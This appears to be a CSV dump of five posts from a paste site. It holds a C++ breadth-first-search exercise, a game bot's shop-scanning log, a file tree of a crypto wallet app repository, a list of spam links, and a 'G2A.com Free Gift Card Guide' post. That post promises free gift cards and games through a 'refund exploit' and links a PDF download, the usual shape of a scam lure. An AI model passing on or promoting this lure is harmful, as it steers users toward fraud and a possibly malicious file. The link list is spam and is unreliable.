id,title,username,language,date,content
XutCWreT,🤑 G2A.com Free Gift Card Guide Jun 2024 FIX 🤑,jusst2k4,GetText,Monday 3rd of June 2024 12:07:30 AM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Amazon, Steam, Xbox, Playstation gift cards & everything else offered.

This is the most up to date version of this script. Any other one posted will not work!
 
PDF guide here:
https://drive.google.com/file/d/1thJ3r_goEZ3BA-wE8sNYbGUhGv6gTnXz/view?usp=g2a_refund_exploit_483811.pdf

Working as of:
03 June 2024"
wJxeBhhH,FDRGRDGDR,gadungw71,PHP,Sunday 2nd of June 2024 10:56:12 PM CDT,"•	https://www.imdb.com/list/ls547787402/
•	https://www.imdb.com/list/ls547787972/
•	https://www.imdb.com/list/ls547788510/
•	https://www.imdb.com/list/ls547788164/
•	https://www.imdb.com/list/ls547105337/
•	https://www.imdb.com/list/ls547105345/
•	https://www.imdb.com/list/ls547105615/
•	https://www.imdb.com/list/ls547105669/
•	https://www.kooapp.com/koo/guest_P68S8O/79aef536-b880-4700-8a08-4eca1644edc5
•	https://wandering.flarum.cloud/d/67590-bbtbnymymy
•	https://hiuderyy.hashnode.dev/bntnguymiu
•	https://click4r.com/posts/g/16981096/wikwikvina
•	https://medium.com/@aleena02/%E0%B8%AD%E0%B8%99%E0%B8%87%E0%B8%84%E0%B9%8C-2024-%E0%B9%80%E0%B8%95%E0%B9%87%E0%B8%A1%E0%B9%80%E0%B8%A3%E0%B8%B7%E0%B9%88%E0%B8%AD%E0%B8%87-fhd-%E0%B8%9E%E0%B8%B2%E0%B8%81%E0%B8%A2%E0%B9%8C%E0%B9%84%E0%B8%97%E0%B8%A2-499818f141d4
•	https://open.firstory.me/user/clwyf8p9c24e001u26b808urk
•	https://www.onfeetnation.com/profiles/blogs/vcbtnfny
•	https://hackmd.io/@rerewilli6/Sk35snqEA
•	https://demo.hedgedoc.org/s/BITZKnYgv
•	https://rentry.co/oymwiosi
•	https://paste.ee/p/VNGBn
•	https://yamcode.com/dfbdtnymy
•	https://start.me/w/4rDgEa
•	https://plaza.rakuten.co.jp/aryasantosso/diary/202406030000/
•	https://telegra.ph/DSBESB-06-03
•	https://muckrack.com/vangilde-sposito/bio
•	https://profile.hatena.ne.jp/basderta/
•	http://aldenfamilydentistry.com/UserProfile/tabid/57/userId/786338/Default.aspx
•	https://www.fitlynk.com/1717386878F805381
"
8hBFYs9X,solved B7 task,hpnq,C++,Sunday 2nd of June 2024 10:53:39 PM CDT,"#include <iostream>
#include <queue>
#include <random>

#define mp make_pair
#define cve(tpy) for (int i = 0; i < sizeof(tpy)/sizeof(tpy[0]); i++) {for(int j = 0; j < sizeof(tpy[i])/sizeof(tpy[i][0]); j++){cout << tpy[i][j] << "" "";  }cout << ""\n"";} ;
#define f first
#define s second
#define loop(i, x, n) for (int i = x; i < n; i++)
#define joop(x, n) for (ll j = x; j < n; j++)
#define lp(n) for (ll i = 0; i < n; i++)
#define err cout << ""ERROR"" << endl;
#define all(x) x.begin(), x.end()
#define pb push_back
#define sz(x) x.size()
#define rndm rng()

using namespace std;

// types
typedef long long ll;
typedef long double ld;

// types of data
#define inf 1000000000
#define infll 1000000000000000000
#define INF ll(1e9)

#define md 998244353
#define mod 1000000009
//#define K 239017

#define DEBUG 1

const int N = 20;

void bfs(int adjList[N][N], int startNode, bool visited[N]) {
    // Create a queue for BFS
    int queue[N];
    int front = 0, rear = 0;

    // Mark the current node as visited and enqueue it
    visited[startNode] = true;
    queue[rear++] = startNode;

    // Iterate over the queue
    while (front != rear) {
        int currentNode = queue[front++];
        for (int neighbor = 0; neighbor < N; neighbor++) {
            if (adjList[currentNode][neighbor] && !visited[neighbor]) {
                visited[neighbor] = true;
                queue[rear++] = neighbor;
            }
        }
    }
}

void solve() {
    int n = 20;
    int g[N][N] = {0};
    loop(i, 0, n) {
        loop(j, 0, n) {
            int a;
            cin >> a;
            if (a == 1) {
                g[i][j] = 1;
                g[j][i] = 1;
            }
        }
    }
    int start = 2;
    bool vis[N] = {0};
    cout << ""first group:\n"";
    bfs(g, start, vis);
    loop(i, 0, n) {
        if (vis[i]) {
            cout << i + 1 << "" "";
        }
    }
    cout << ""\n"";
    cout << ""second group:\n"";
    bool vis2[N] = {0};
    bfs(g, start, vis2);
    loop(i, 0, n) {
        if (!vis2[i]) {
            cout << i + 1 << "" "";
        }
    }
}

int main() {
    freopen(""text.txt"", ""r"", stdin);
    solve();
    return 1;
}
"
Ah8T7NGW,Untitled,SaarChaffee,Visual Pro Log,Sunday 2nd of June 2024 10:48:47 PM CDT,"```log
2024-06-03 11:34:11.654 | INFO | [Server] en                                                                           
2024-06-03 11:34:11.741 | INFO | Costs: [PURPLECOINS_3, YELLOWCOINS_1, YELLOWCOINS_2]                                  
2024-06-03 11:34:11.747 | INFO | Loading template folder: ./assets/shop/os                                             
2024-06-03 11:34:11.865 | INFO | [next_template_index] 106                                                             
2024-06-03 11:34:11.890 | INFO | Loading OCR dependencies                                                              
2024-06-03 11:34:13.113 | INFO | Loading OCR model: ./bin/cnocr_models/azur_lane                                       
2024-06-03 11:34:13.215 | INFO | [Amount_ocr 1.328s] [1, 1, 1, 1, 1]                                                   
2024-06-03 11:34:13.273 | INFO | [Price_ocr 0.044s] [300, 100, 20, 300, 50]                                            
2024-06-03 11:34:13.277 | INFO | Shop items found: ['GearPartSpecialized_x1_PurpleCoins_x300',                         
'GearPartPrototype_x1_PurpleCoins_x100', 'PlateRandomT4_x1_PurpleCoins_x20', 'GearDesignPlanT3_x1_PurpleCoins_x300',   
'GearDesignPlanT2_x1_PurpleCoins_x50']                                                                                 
2024-06-03 11:34:13.300 | INFO | [Amount_ocr 0.013s] [1, 1]                                                            
2024-06-03 11:34:13.335 | INFO | [Price_ocr 0.020s] [2500, 1000]                                                       
2024-06-03 11:34:13.340 | INFO | Shop items found: ['RepairPackFull2_x1_YellowCoins_x2500',                            
'RepairPackFull_x1_YellowCoins_x1000']                                                                                 
2024-06-03 11:34:13.372 | INFO | Costs: [PURPLECOINS_1, PURPLECOINS_2, YELLOWCOINS_1, YELLOWCOINS_2]                   
2024-06-03 11:34:13.400 | INFO | [Amount_ocr 0.022s] [1, 1, 1, 1, 1]                                                   
2024-06-03 11:34:13.452 | INFO | [Price_ocr 0.039s] [300, 100, 20, 500, 300]                                           
2024-06-03 11:34:13.457 | INFO | Shop items found: ['GearPartSpecialized_x1_PurpleCoins_x300',                         
'GearPartPrototype_x1_PurpleCoins_x100', 'PlateRandomT4_x1_PurpleCoins_x20',                                           
'OrdnanceTestingReportT3_x1_PurpleCoins_x500', 'GearDesignPlanT3_x1_PurpleCoins_x300']                                 
2024-06-03 11:34:13.478 | INFO | [Amount_ocr 0.013s] [1, 1]                                                            
2024-06-03 11:34:13.503 | INFO | [Price_ocr 0.019s] [2500, 1000]                                                       
2024-06-03 11:34:13.508 | INFO | Shop items found: ['RepairPackFull2_x1_YellowCoins_x2500',                            
'RepairPackFull_x1_YellowCoins_x1000']                                                                                 
2024-06-03 11:34:13.539 | INFO | Costs: [PURPLECOINS_1, PURPLECOINS_2, YELLOWCOINS_1, YELLOWCOINS_2]                   
2024-06-03 11:34:13.567 | INFO | [Amount_ocr 0.022s] [1, 1, 1, 1, 1]                                                   
2024-06-03 11:34:13.614 | INFO | [Price_ocr 0.037s] [300, 100, 20, 500, 300]                                           
2024-06-03 11:34:13.619 | INFO | Shop items found: ['GearPartSpecialized_x1_PurpleCoins_x300',                         
'GearPartPrototype_x1_PurpleCoins_x100', 'PlateRandomT4_x1_PurpleCoins_x20',                                           
'OrdnanceTestingReportT3_x1_PurpleCoins_x500', 'GearDesignPlanT3_x1_PurpleCoins_x300']                                 
2024-06-03 11:34:13.640 | INFO | [Amount_ocr 0.014s] [1, 1]                                                            
2024-06-03 11:34:13.664 | INFO | [Price_ocr 0.018s] [2500, 1000]                                                       
2024-06-03 11:34:13.669 | INFO | Shop items found: ['RepairPackFull2_x1_YellowCoins_x2500',                            
'RepairPackFull_x1_YellowCoins_x1000']                                                                                 
2024-06-03 11:34:13.700 | INFO | Costs: [PURPLECOINS_1, PURPLECOINS_1, PURPLECOINS_2, PURPLECOINS_2]                   
2024-06-03 11:34:13.728 | INFO | [Amount_ocr 0.022s] [1, 1, 1, 1, 1]                                                   
2024-06-03 11:34:13.780 | INFO | [Price_ocr 0.039s] [1, 5, 5, 5, 5]                                                    
2024-06-03 11:34:13.785 | INFO | Shop items found: ['METARedBookT2_x1_PurpleCoins_x1',                                 
'SupercavitationGenerator_x1_PurpleCoins_x5', 'NeuroplasticProstheticArm_x1_PurpleCoins_x5',                           
'NanoceramicAlloy_x1_PurpleCoins_x5', 'CrystallizedHeatResistantSteel_x1_PurpleCoins_x5']                              
2024-06-03 11:34:13.814 | INFO | [Amount_ocr 0.021s] [1, 1, 1, 1, 1]                                                   
2024-06-03 11:34:13.864 | INFO | [Price_ocr 0.039s] [1, 5, 5, 5, 5]                                                    
2024-06-03 11:34:13.868 | INFO | Shop items found: ['METARedBookT2_x1_PurpleCoins_x1',                                 
'SupercavitationGenerator_x1_PurpleCoins_x5', 'NeuroplasticProstheticArm_x1_PurpleCoins_x5',                           
'NanoceramicAlloy_x1_PurpleCoins_x5', 'CrystallizedHeatResistantSteel_x1_PurpleCoins_x5']                              
2024-06-03 11:34:13.900 | INFO | Costs: [PURPLECOINS_1, PURPLECOINS_1, PURPLECOINS_2, PURPLECOINS_2]                   
2024-06-03 11:34:13.928 | INFO | [Amount_ocr 0.022s] [1, 1, 1, 1, 1]                                                   
2024-06-03 11:34:13.985 | INFO | [Price_ocr 0.038s] [100, 20, 50, 500, 150]                                            
2024-06-03 11:34:13.990 | INFO | Shop items found: ['OrdnanceTestingReportT2_x1_PurpleCoins_x100',                     
'OrdnanceTestingReportT1_x1_PurpleCoins_x20', 'GearDesignPlanT2_x1_PurpleCoins_x50', 'RepairPack2_x1_YellowCoins_x500',
'RepairPack_x1_YellowCoins_x150']                                                                                      
2024-06-03 11:34:14.020 | INFO | [Amount_ocr 0.022s] [1, 1, 1, 1, 1]                                                   
2024-06-03 11:34:14.069 | INFO | [Price_ocr 0.038s] [100, 20, 100, 20, 50]                                             
2024-06-03 11:34:14.074 | INFO | Shop items found: ['GearPartPrototype_x1_PurpleCoins_x100',                           
'PlateRandomT4_x1_PurpleCoins_x20', 'OrdnanceTestingReportT2_x1_PurpleCoins_x100',                                     
'OrdnanceTestingReportT1_x1_PurpleCoins_x20', 'GearDesignPlanT2_x1_PurpleCoins_x50']                                   
2024-06-03 11:34:14.105 | INFO | Costs: [PURPLECOINS_1, PURPLECOINS_2, YELLOWCOINS_1, YELLOWCOINS_2]                   
2024-06-03 11:34:14.133 | INFO | [Amount_ocr 0.022s] [1, 1, 1, 1, 1]                                                   
2024-06-03 11:34:14.179 | INFO | [Price_ocr 0.037s] [300, 100, 20, 500, 300]                                           
2024-06-03 11:34:14.184 | INFO | Shop items found: ['GearPartSpecialized_x1_PurpleCoins_x300',                         
'GearPartPrototype_x1_PurpleCoins_x100', 'PlateRandomT4_x1_PurpleCoins_x20',                                           
'OrdnanceTestingReportT3_x1_PurpleCoins_x500', 'GearDesignPlanT3_x1_PurpleCoins_x300']                                 
2024-06-03 11:34:14.205 | INFO | [Amount_ocr 0.013s] [1, 1]                                                            
2024-06-03 11:34:14.231 | INFO | [Price_ocr 0.019s] [2500, 1000]                                                       
2024-06-03 11:34:14.235 | INFO | Shop items found: ['RepairPackFull2_x1_YellowCoins_x2500',                            
'RepairPackFull_x1_YellowCoins_x1000']                                                                                 
2024-06-03 11:34:14.266 | INFO | Costs: [YELLOWCOINS_1, YELLOWCOINS_1, YELLOWCOINS_2]                                  
2024-06-03 11:34:14.294 | INFO | [Amount_ocr 0.021s] [1, 1, 1, 1, 1]                                                   
2024-06-03 11:34:14.352 | INFO | [Price_ocr 0.037s] [500, 10, 10, 10, 3000]                                            
2024-06-03 11:34:14.358 | INFO | Shop items found: ['EnergyStorageDevice_x1_YellowCoins_x500',                         
'TuningSampleCombat_x1_PurpleCoins_x10', 'TuningSampleSurvival_x1_PurpleCoins_x10',                                    
'TuningSampleOffence_x1_PurpleCoins_x10', 'LoggerAbyssalT4_x1_YellowCoins_x3000']                                      
2024-06-03 11:34:14.376 | INFO | [Amount_ocr 0.010s] [1]                                                               
2024-06-03 11:34:14.395 | INFO | [Price_ocr 0.013s] [1000]                                                             
2024-06-03 11:34:14.400 | INFO | Shop items found: ['LoggerAbyssalT3_x1_YellowCoins_x1000']                            
```"
WEaR5uTR,com.tangem.wallet 2024-06-03 Tree structure of repository,dannybuntu,Bash,Sunday 2nd of June 2024 10:19:21 PM CDT,"danny@lw10:~/work/builds/com.tangem/tangem-app-android$ tree
.
├── app
│   ├── build.gradle.kts
│   ├── libs
│   │   ├── ripple-core-0.0.1.jar
│   │   └── walletconnect-1.5.6.aar
│   ├── proguard-rules.pro
│   └── src
│       ├── androidTest
│       │   └── kotlin
│       │       └── com
│       │           └── tangem
│       │               ├── common
│       │               │   ├── ApplicationInjectionExecutionRule.kt
│       │               │   ├── BaseTestCase.kt
│       │               │   ├── di
│       │               │   │   ├── TangemMockedApplication.kt
│       │               │   │   └── TestModule.kt
│       │               │   ├── HiltTestRunner.kt
│       │               │   └── TangemEmptyApplication.kt
│       │               ├── screens
│       │               │   ├── DisclaimerScreen.kt
│       │               │   ├── StoriesScreen.kt
│       │               │   └── WalletScreen.kt
│       │               └── tests
│       │                   ├── MainScreenTest.kt
│       │                   ├── ScanErrorTest.kt
│       │                   └── StoriesTest.kt
│       ├── debug
│       │   └── res
│       │       ├── values
│       │       │   └── strings.xml
│       │       └── xml
│       │           └── network_security_config.xml
│       ├── external
│       │   └── res
│       │       ├── values
│       │       │   └── strings.xml
│       │       └── xml
│       │           └── network_security_config.xml
│       ├── internal
│       │   └── res
│       │       ├── values
│       │       │   └── strings.xml
│       │       └── xml
│       │           └── network_security_config.xml
│       ├── main
│       │   ├── AndroidManifest.xml
│       │   ├── assets
│       │   │   ├── features_dev.json
│       │   │   ├── features_prod.json
│       │   │   ├── fw_hashes.json
│       │   │   ├── tangem-app-config
│       │   │   ├── testnet_tokens.json
│       │   │   └── tokens.json
│       │   ├── ic_launcher-playstore.png
│       │   ├── java
│       │   │   └── com
│       │   │       └── tangem
│       │   │           └── tap
│       │   │               ├── ActivityResultCaller.kt
│       │   │               ├── ApplicationEntryPoint.kt
│       │   │               ├── common
│       │   │               │   ├── ActivityResultCallbackHolder.kt
│       │   │               │   ├── analytics
│       │   │               │   │   ├── AnalyticsEventsLogger.kt
│       │   │               │   │   ├── AnalyticsFactory.kt
│       │   │               │   │   ├── api
│       │   │               │   │   │   └── AnalyticsHandlerBuilder.kt
│       │   │               │   │   ├── converters
│       │   │               │   │   │   ├── AnalyticsErrorConverter.kt
│       │   │               │   │   │   └── ParamCardCurrencyConverter.kt
│       │   │               │   │   ├── DefaultChangeCardAnalyticsContextUseCase.kt
│       │   │               │   │   ├── events
│       │   │               │   │   │   ├── AnalyticsParam.kt
│       │   │               │   │   │   ├── BlockchainExceptionEvent.kt
│       │   │               │   │   │   ├── Chat.kt
│       │   │               │   │   │   ├── DetailsScreen.kt
│       │   │               │   │   │   ├── IntroductionProcess.kt
│       │   │               │   │   │   ├── MainScreen.kt
│       │   │               │   │   │   ├── ManageTokens.kt
│       │   │               │   │   │   ├── Onboarding.kt
│       │   │               │   │   │   ├── Settings.kt
│       │   │               │   │   │   ├── Shop.kt
│       │   │               │   │   │   ├── SignIn.kt
│       │   │               │   │   │   ├── Token.kt
│       │   │               │   │   │   └── WalletConnect.kt
│       │   │               │   │   ├── handlers
│       │   │               │   │   │   ├── amplitude
│       │   │               │   │   │   │   ├── AmplitudeAnalyticsHandler.kt
│       │   │               │   │   │   │   ├── AmplitudeClient.kt
│       │   │               │   │   │   │   └── AmplitudeLogClient.kt
│       │   │               │   │   │   ├── BlockchainExceptionHandler.kt
│       │   │               │   │   │   └── firebase
│       │   │               │   │   │       ├── FirebaseAnalyticsHandler.kt
│       │   │               │   │   │       ├── FirebaseClient.kt
│       │   │               │   │   │       └── FirebaseLogClient.kt
│       │   │               │   │   └── paramsInterceptor
│       │   │               │   │       ├── CardContextInterceptor.kt
│       │   │               │   │       └── LinkedCardContextInterceptor.kt
│       │   │               │   ├── apptheme
│       │   │               │   │   └── MutableAppThemeModeHolder.kt
│       │   │               │   ├── chat
│       │   │               │   │   ├── ChatManager.kt
│       │   │               │   │   └── opener
│       │   │               │   │       ├── ChatOpener.kt
│       │   │               │   │       └── implementation
│       │   │               │   │           └── SprinklrChatOpener.kt
│       │   │               │   ├── clipboard
│       │   │               │   │   ├── DefaultClipboardManager.kt
│       │   │               │   │   └── MockClipboardManager.kt
│       │   │               │   ├── compose
│       │   │               │   │   ├── extensions
│       │   │               │   │   │   ├── AnimatedValue.kt
│       │   │               │   │   │   ├── Dp.kt
│       │   │               │   │   │   ├── ImageBitmap.kt
│       │   │               │   │   │   └── Painter.kt
│       │   │               │   │   └── TangemTextFieldsDefault.kt
│       │   │               │   ├── CurrencyConverter.kt
│       │   │               │   ├── CustomTabsManager.kt
│       │   │               │   ├── DialogManager.kt
│       │   │               │   ├── entities
│       │   │               │   │   ├── Button.kt
│       │   │               │   │   └── ProgressState.kt
│       │   │               │   ├── extensions
│       │   │               │   │   ├── Activity.kt
│       │   │               │   │   ├── Analytics.kt
│       │   │               │   │   ├── Bitmap.kt
│       │   │               │   │   ├── Blockchain.kt
│       │   │               │   │   ├── Context.kt
│       │   │               │   │   ├── Int.kt
│       │   │               │   │   ├── Map.kt
│       │   │               │   │   ├── Navigation.kt
│       │   │               │   │   ├── Specific.kt
│       │   │               │   │   ├── Store.kt
│       │   │               │   │   ├── StringBuilder.kt
│       │   │               │   │   ├── String.kt
│       │   │               │   │   ├── TextView.kt
│       │   │               │   │   ├── UI.kt
│       │   │               │   │   ├── ViewGroup.kt
│       │   │               │   │   ├── WalletManager.kt
│       │   │               │   │   └── WebView.kt
│       │   │               │   ├── feature
│       │   │               │   │   └── Feature.kt
│       │   │               │   ├── feedback
│       │   │               │   │   ├── AdditionalFeedbackInfo.kt
│       │   │               │   │   ├── DefaultFeedbackManagerFeatureToggles.kt
│       │   │               │   │   ├── FeedbackDataBuilder.kt
│       │   │               │   │   ├── FeedbackData.kt
│       │   │               │   │   └── FeedbackManager.kt
│       │   │               │   ├── GlobalLayoutStateHandler.kt
│       │   │               │   ├── Handler.kt
│       │   │               │   ├── haptic
│       │   │               │   │   └── DefaultHapticManager.kt
│       │   │               │   ├── images
│       │   │               │   │   └── Coil.kt
│       │   │               │   ├── KeyboardObserver.kt
│       │   │               │   ├── leapfrogWidget
│       │   │               │   │   └── TestLeapfrogFragment.kt
│       │   │               │   ├── log
│       │   │               │   │   ├── TangemCardSDKLogger.kt
│       │   │               │   │   ├── TangemLogCollector.kt
│       │   │               │   │   └── TimberFormatStrategy.kt
│       │   │               │   ├── recyclerView
│       │   │               │   │   └── SpaceItemDecoration.kt
│       │   │               │   ├── redux
│       │   │               │   │   ├── AccessCodeRequestPolicyMiddleware.kt
│       │   │               │   │   ├── AppDialog.kt
│       │   │               │   │   ├── AppReducer.kt
│       │   │               │   │   ├── AppState.kt
│       │   │               │   │   ├── FeatureRepositoryProvider.kt
│       │   │               │   │   ├── global
│       │   │               │   │   │   ├── GlobalAction.kt
│       │   │               │   │   │   ├── GlobalMiddleware.kt
│       │   │               │   │   │   ├── GlobalReducer.kt
│       │   │               │   │   │   └── GlobalState.kt
│       │   │               │   │   ├── legacy
│       │   │               │   │   │   └── LegacyMiddleware.kt
│       │   │               │   │   ├── LockUserWalletsTimerMiddleware.kt
│       │   │               │   │   ├── LogMiddleware.kt
│       │   │               │   │   ├── navigation
│       │   │               │   │   │   ├── NavigationMiddleware.kt
│       │   │               │   │   │   └── NavigationReducer.kt
│       │   │               │   │   └── NotificationsMiddleware.kt
│       │   │               │   ├── snackBar
│       │   │               │   │   └── MaxAmountSnackbar.kt
│       │   │               │   ├── SnackbarHandler.kt
│       │   │               │   ├── TestActions.kt
│       │   │               │   ├── text
│       │   │               │   │   ├── DecimalDigitsInputFilter.kt
│       │   │               │   │   └── Truncate.kt
│       │   │               │   ├── toggleWidget
│       │   │               │   │   ├── IndeterminateProgressButtonWidget.kt
│       │   │               │   │   ├── RefreshBalanceWidget.kt
│       │   │               │   │   └── ViewStateWidget.kt
│       │   │               │   ├── transitions
│       │   │               │   │   └── OnboardingTransitions.kt
│       │   │               │   └── ui
│       │   │               │       ├── AddressInfoBottomSheetDialog.kt
│       │   │               │       ├── RussianCardholdersWarningBottomSheetDialog.kt
│       │   │               │       ├── ScanFailsDialog.kt
│       │   │               │       ├── SimpleAlertDialog.kt
│       │   │               │       └── SimpleOkDialog.kt
│       │   │               ├── data
│       │   │               │   ├── RuntimeUserWalletsStore.kt
│       │   │               │   └── TangemBlockchainSDKLogger.kt
│       │   │               ├── di
│       │   │               │   ├── ActivityModule.kt
│       │   │               │   ├── analytics
│       │   │               │   │   └── AnalyticsModule.kt
│       │   │               │   ├── AppStateHolderModule.kt
│       │   │               │   ├── ClipboardManagerModule.kt
│       │   │               │   ├── data
│       │   │               │   │   ├── BlockchainSDKLoggerModule.kt
│       │   │               │   │   ├── CardDataModule.kt
│       │   │               │   │   ├── CardSDKLoggerModule.kt
│       │   │               │   │   └── UserWalletsStoreModule.kt
│       │   │               │   ├── domain
│       │   │               │   │   ├── AnalyticsDomainModule.kt
│       │   │               │   │   ├── AppCurrencyDomainModule.kt
│       │   │               │   │   ├── AppThemeDomainModule.kt
│       │   │               │   │   ├── CardDomainModule.kt
│       │   │               │   │   ├── CardLegacyDomainModule.kt
│       │   │               │   │   ├── FeedbackDomainModule.kt
│       │   │               │   │   ├── MnemonicModule.kt
│       │   │               │   │   ├── OnboardingDomainModule.kt
│       │   │               │   │   ├── QrScanningDomainModule.kt
│       │   │               │   │   ├── SettingsDomainModule.kt
│       │   │               │   │   ├── StakingDomainModule.kt
│       │   │               │   │   ├── TokensDomainModule.kt
│       │   │               │   │   ├── TransactionDomainModule.kt
│       │   │               │   │   ├── TxHistoryDomainModule.kt
│       │   │               │   │   ├── VisaDomainModule.kt
│       │   │               │   │   ├── WalletConnectDomainModule.kt
│       │   │               │   │   ├── WalletManagersFacadeModule.kt
│       │   │               │   │   └── WalletsDomainModule.kt
│       │   │               │   ├── FeedbackManagerFeatureTogglesModule.kt
│       │   │               │   ├── HapticModule.kt
│       │   │               │   ├── Qualifiers.kt
│       │   │               │   ├── RootAppComponentContextModule.kt
│       │   │               │   ├── TangemSdkManagerModule.kt
│       │   │               │   ├── ThemeModule.kt
│       │   │               │   └── UiDependenciesModule.kt
│       │   │               ├── domain
│       │   │               │   ├── card
│       │   │               │   │   ├── DefaultDeleteSavedAccessCodesUseCase.kt
│       │   │               │   │   ├── DefaultDerivationsRepository.kt
│       │   │               │   │   ├── DefaultResetCardUseCase.kt
│       │   │               │   │   └── MissedDerivationsFinder.kt
│       │   │               │   ├── configurable
│       │   │               │   │   └── warningMessage
│       │   │               │   │       ├── WarningMessage.kt
│       │   │               │   │       └── WarningMessagesManager.kt
│       │   │               │   ├── extensions
│       │   │               │   │   └── Card.kt
│       │   │               │   ├── model
│       │   │               │   │   ├── Currency.kt
│       │   │               │   │   ├── PendingTransaction.kt
│       │   │               │   │   └── WalletAddressData.kt
│       │   │               │   ├── scanCard
│       │   │               │   │   ├── chains
│       │   │               │   │   │   ├── AnalyticsChain.kt
│       │   │               │   │   │   ├── CheckForOnboardingChain.kt
│       │   │               │   │   │   ├── DisclaimerChain.kt
│       │   │               │   │   │   ├── FailedScansCounterChain.kt
│       │   │               │   │   │   ├── ScanChainException.kt
│       │   │               │   │   │   └── ScanChainResult.kt
│       │   │               │   │   ├── DefaultScanCardProcessor.kt
│       │   │               │   │   ├── LegacyScanProcessor.kt
│       │   │               │   │   ├── repository
│       │   │               │   │   │   └── DefaultScanCardRepository.kt
│       │   │               │   │   ├── UseCaseScanProcessor.kt
│       │   │               │   │   └── utils
│       │   │               │   │       └── ScanCardExceptionConverter.kt
│       │   │               │   ├── sdk
│       │   │               │   │   ├── impl
│       │   │               │   │   │   ├── DefaultTangemSdkManager.kt
│       │   │               │   │   │   └── MockTangemSdkManager.kt
│       │   │               │   │   ├── mocks
│       │   │               │   │   │   ├── content
│       │   │               │   │   │   │   ├── Wallet2MockContent.kt
│       │   │               │   │   │   │   └── WalletMockContent.kt
│       │   │               │   │   │   ├── MockContent.kt
│       │   │               │   │   │   └── MockProvider.kt
│       │   │               │   │   └── TangemSdkManager.kt
│       │   │               │   ├── settings
│       │   │               │   │   └── DefaultLegacySettingsRepository.kt
│       │   │               │   ├── TangemSigner.kt
│       │   │               │   ├── TapErrors.kt
│       │   │               │   ├── TapWalletManager.kt
│       │   │               │   ├── tasks
│       │   │               │   │   ├── product
│       │   │               │   │   │   ├── CardInitializationValidator.kt
│       │   │               │   │   │   ├── CreateProductWalletTask.kt
│       │   │               │   │   │   ├── CreateWalletsTask.kt
│       │   │               │   │   │   ├── DerivationsFinder.kt
│       │   │               │   │   │   ├── ProductCommandProcessor.kt
│       │   │               │   │   │   ├── ResetToFactorySettingsTask.kt
│       │   │               │   │   │   └── ScanProductTask.kt
│       │   │               │   │   └── SignHashesTask.kt
│       │   │               │   ├── twins
│       │   │               │   │   ├── CreateFirstTwinWalletTask.kt
│       │   │               │   │   ├── CreateSecondTwinWalletTask.kt
│       │   │               │   │   ├── FinalizeTwinTask.kt
│       │   │               │   │   ├── IncompatibleTwinCard.kt
│       │   │               │   │   ├── TwinCardsManager.kt
│       │   │               │   │   ├── TwinCardsWidget.kt
│       │   │               │   │   ├── WriteProtectedIssuerDataTask.kt
│       │   │               │   │   └── WrongTwinCard.kt
│       │   │               │   ├── userWalletList
│       │   │               │   │   ├── di
│       │   │               │   │   │   └── UserWalletsListManagerModule.kt
│       │   │               │   │   ├── implementation
│       │   │               │   │   │   ├── BiometricUserWalletsListManager.kt
│       │   │               │   │   │   ├── GeneralUserWalletsListManager.kt
│       │   │               │   │   │   └── RuntimeUserWalletsListManager.kt
│       │   │               │   │   ├── model
│       │   │               │   │   │   ├── UserWalletEncryptionKey.kt
│       │   │               │   │   │   └── UserWalletInformation.kt
│       │   │               │   │   ├── repository
│       │   │               │   │   │   ├── DelegatedKeystoreManager.kt
│       │   │               │   │   │   ├── implementation
│       │   │               │   │   │   │   ├── BiometricUserWalletsKeysRepository.kt
│       │   │               │   │   │   │   ├── DefaultSelectedUserWalletRepository.kt
│       │   │               │   │   │   │   ├── DefaultUserWalletsPublicInformationRepository.kt
│       │   │               │   │   │   │   └── DefaultUserWalletsSensitiveInformationRepository.kt
│       │   │               │   │   │   ├── SelectedUserWalletRepository.kt
│       │   │               │   │   │   ├── UserWalletsKeysRepository.kt
│       │   │               │   │   │   ├── UserWalletsKeysStoreDecorator.kt
│       │   │               │   │   │   ├── UserWalletsPublicInformationRepository.kt
│       │   │               │   │   │   └── UserWalletsSensitiveInformationRepository.kt
│       │   │               │   │   └── utils
│       │   │               │   │       ├── ByteArrayListExtensions.kt
│       │   │               │   │       ├── json
│       │   │               │   │       │   ├── ByteArrayKeyAdapter.kt
│       │   │               │   │       │   ├── CardBackupStatusAdapter.kt
│       │   │               │   │       │   ├── DerivationPathAdapterWithMigration.kt
│       │   │               │   │       │   ├── ExtendedPublicKeysMapAdapter.kt
│       │   │               │   │       │   ├── ScanResponseDerivedKeysMapAdapter.kt
│       │   │               │   │       │   └── WalletDerivedKeysMapAdapter.kt
│       │   │               │   │       ├── Mapper.kt
│       │   │               │   │       └── UserWalletEncyptionKeyCalculator.kt
│       │   │               │   ├── walletconnect
│       │   │               │   │   ├── BnbHelper.kt
│       │   │               │   │   ├── EthSignHelper.kt
│       │   │               │   │   └── WalletConnectSdkHelper.kt
│       │   │               │   └── walletconnect2
│       │   │               │       ├── app
│       │   │               │       │   ├── TangemWcBlockchainHelper.kt
│       │   │               │       │   └── WalletConnectEventsHandlerImpl.kt
│       │   │               │       ├── data
│       │   │               │       │   ├── DefaultLegacyWalletConnectRepository.kt
│       │   │               │       │   └── DefaultWalletConnectSessionsRepository.kt
│       │   │               │       ├── di
│       │   │               │       │   └── WalletConnectInteractorModule.kt
│       │   │               │       ├── domain
│       │   │               │       │   ├── LegacyWalletConnectRepository.kt
│       │   │               │       │   ├── mapper
│       │   │               │       │   │   └── SolanaTransactionMappings.kt
│       │   │               │       │   ├── models
│       │   │               │       │   │   ├── Account.kt
│       │   │               │       │   │   ├── binance
│       │   │               │       │   │   │   ├── WcBinanceCancelOrder.kt
│       │   │               │       │   │   │   ├── WcBinanceOrder.kt
│       │   │               │       │   │   │   ├── WcBinanceTradeOrder.kt
│       │   │               │       │   │   │   └── WcBinanceTransferOrder.kt
│       │   │               │       │   │   ├── BnbData.kt
│       │   │               │       │   │   ├── EthTransactionData.kt
│       │   │               │       │   │   ├── NetworkNamespace.kt
│       │   │               │       │   │   ├── RequestData.kt
│       │   │               │       │   │   ├── Session.kt
│       │   │               │       │   │   ├── solana
│       │   │               │       │   │   │   ├── SolanaSignMessage.kt
│       │   │               │       │   │   │   └── SolanaTransactionRequest.kt
│       │   │               │       │   │   ├── WalletConnectError.kt
│       │   │               │       │   │   ├── WalletConnectEvents.kt
│       │   │               │       │   │   └── WalletConnectSession.kt
│       │   │               │       │   ├── WalletConnectEventsHandler.kt
│       │   │               │       │   ├── WalletConnectInteractor.kt
│       │   │               │       │   ├── WalletConnectSessionsRepository.kt
│       │   │               │       │   ├── WcBlockchainHelper.kt
│       │   │               │       │   ├── WcJrpcMethods.kt
│       │   │               │       │   ├── WcPreparedRequest.kt
